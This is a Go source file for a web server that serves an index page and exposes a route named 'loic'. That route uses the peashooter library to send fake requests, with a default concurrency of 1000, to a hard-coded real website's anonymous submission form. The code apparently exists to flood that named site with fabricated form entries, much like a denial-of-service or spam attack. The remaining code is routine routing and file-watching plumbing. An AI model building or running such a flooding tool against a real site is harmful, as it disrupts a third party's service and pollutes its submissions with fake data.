package main

import (
	"context"
	"flag"
	"fmt"
	"io"
	"net/http"
	"os"
	"strconv"

	"github.com/fsnotify/fsnotify"
	"github.com/gorilla/mux"
	"github.com/guygrigsby/peashooter"
	"github.com/sirupsen/logrus"
)

const (
	DEFAULT_CONCURRENCY     = 1000
	DEFAULT_CONFIG_LOCATION = "public/index.html"
)

var (
	hotload bool
	index   *[]byte
)

func main() {
	flag.BoolVar(&hotload, "hotload", false, "hoot reloading of index.html for developmnt.")
	flag.Parse()

	log := logrus.New()

	f, err := os.Open(DEFAULT_CONFIG_LOCATION)
	if err != nil {
		panic(err)
	}

	i, err := io.ReadAll(f)
	if err != nil {
		panic(err)
	}
	index = &i

	go Watch(
		[]string{DEFAULT_CONFIG_LOCATION},
		func(b []byte) error {
			*index = b
			return nil
		},
		log.WithField("service", "watcher"),
	)

	var (
		concurrency int
		ctx         = context.Background()
		formURL     = "https://prolifewhistleblower.com/anonymous-form/"
	)
	c, err := strconv.ParseInt(os.Getenv("PEASHOOTER_CONCURRENCY"), 10, 16)
	if err != nil {

		concurrency = DEFAULT_CONCURRENCY
	} else {
		concurrency = int(c)
	}
	r := mux.NewRouter()
	r.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
		_, err := w.Write(*index)
		if err != nil {
			http.Error(w, "Cannot open index.html", http.StatusInternalServerError)
			return
		}
	})
	r.HandleFunc("loic", LOICHandler(ctx, formURL, concurrency, log.WithField("service", "peashooter")))
	r.Handle("/", http.FileServer(http.Dir("../frontend/build")))
	http.Handle("/", r)

	if err := http.ListenAndServe(":3000", r); err != nil {
		log.WithField("error", err).Error("Server Failure")
	}

}

func LOICHandler(ctx context.Context, uri string, concurrency int, log *logrus.Entry) http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {

		res, err := peashooter.Fake(ctx, uri, r, concurrency, log)
		if err != nil {
			http.Error(w, "cannot init paeashooter", http.StatusInternalServerError)
			return
		}
		fmt.Printf("%+v", res)
	}
}

// Watch ...
func Watch(files []string, update func(b []byte) error, log *logrus.Entry) {
	watcher, err := fsnotify.NewWatcher()
	if err != nil {
		log.WithField("err", err).Error("File watcher failure. Cannot start watcher")
		return
	}
	defer watcher.Close()

	done := make(chan bool)
	go func() {

		for {

			select {

			case event := <-watcher.Events:

				if event.Op&fsnotify.Write == fsnotify.Write {

					f, err := os.Open(DEFAULT_CONFIG_LOCATION)
					if err != nil {
						log.WithField("err", err).Error("Cannot open watched file")
					}

					i, err := io.ReadAll(f)
					if err != nil {
						log.WithField("err", err).Error("Cannot read watched file")
					}

					*index = i
					log.WithField("file", event.Name).Info("configuration file updated")
					f.Close()

				}

			case err := <-watcher.Errors:

				log.WithField("err", err).Error("File watcher error")
			}
		}
	}()

	for _, file := range files {

		err = watcher.Add(file)
		if err != nil {

			log.WithFields(logrus.Fields{
				"file": file,
				"err":  err,
			}).Error("File watcher failure: Cannot add file")
			return
		}
		log.WithField("file", file).Info("placed watch on file")
	}

	<-done
}
